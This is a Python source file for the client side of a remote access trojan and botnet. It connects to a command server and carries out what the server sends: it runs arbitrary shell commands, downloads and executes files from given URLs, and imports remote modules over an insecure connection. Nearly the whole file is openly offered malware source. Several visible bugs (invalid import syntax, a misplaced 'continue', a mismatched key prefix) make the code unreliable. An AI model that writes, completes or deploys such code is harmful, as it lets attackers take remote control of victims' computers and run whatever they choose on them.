# A Python RAT n' Botnet
#  by Landon in Python2
#	CLIENT-SIDE C0DE


#
#Updated by a loser to Py3 and gave it some use
#

import socket, os, rsa, thread, subprocess, requests

publicKey = 'JUST PUBLIC KEY NOT THE HEADER OR FOOTER' #Put public key here
privateKey = 'JUST PRIVATE KEY NOT THE HEADER OR FOOTER' #Put private key here


pem_prefix = '-----BEGIN RSA PUBLIC KEY-----\n'
pem_suffix = '\n-----END RSA PUBLIC KEY-----'

priv_prefix = '-----BEGIN RSA PRIVATE KEY-----\n'
priv_suffix = '\n-----END RSA PRIVATE KEY-----'


pubKey = '{}{}{}'.format(pem_prefix, publicKey, pem_suffix)
privKey = '{}{}{}'.format(pem_prefix, privateKey, priv_suffix)


imports = []


bigBro = '127.0.0.1' # Malicious Server IP.

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(( bigBro, 3389 )) # To-do: Change port later. 

def checker(command, arg):
	if command in commands.__dict__:
		commands.__dict__[command]( arg )
	try:
		for iCommands in imports:
			if command in iCommands.commands.__dict__:
				iCommands.commands.__dict__[command]( arg )
	except:
		continue

class commands:
	def log( output ): # Outputs to console.
		print( output )

	def shell( command ): # Runs a shell command.
		os.system( command )
	
	def download( arglist ): # Downloads and executes a file
		args = arglist.split("|")
		r = requests.get(args[0], stream = True)
		with open(args[1],"wb") as pdf:
			for chunk in r.iter_content(chunk_size=1024):
				if chunk:
					pdf.write(chunk)
		pdf.close()
		subprocess.call([args[1],], start_new_session=True, shell=False)
					
	def call( arglist ): # remote import of modules
		import httpimport
		
		args = arglist.split("|")
		
		httpimport.INSECURE = True
		httpimport.add_remote_repo({args[1]}, args[0])
		import args[1]
		imports.append(args[1])	

		
turnedOn = True
while turnedOn:
	message = clientSocket.recv(2048)

	if message == "kill": turnedOn = False

	message = message.split(" ", 1)
	

	if len(message) == 2:
		command, arg = message

	checker(command, arg)

clientSocket.close()
